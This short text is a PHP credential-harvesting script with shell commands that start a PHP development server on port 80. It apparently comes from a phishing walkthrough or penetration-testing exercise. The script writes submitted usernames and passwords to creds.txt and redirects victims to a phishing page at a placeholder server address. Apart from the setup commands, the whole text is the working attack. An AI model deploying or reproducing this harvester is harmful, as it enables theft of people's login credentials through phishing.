# $ mkdir /tmp/tmpserver
# $ cd /tmp/tmpserver
# $ vi index.php #at this step we wrote our index.php file
# $ sudo php -S 0.0.0.0:80
# PHP 7.4.15 Development Server (http://0.0.0.0:80) started

<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
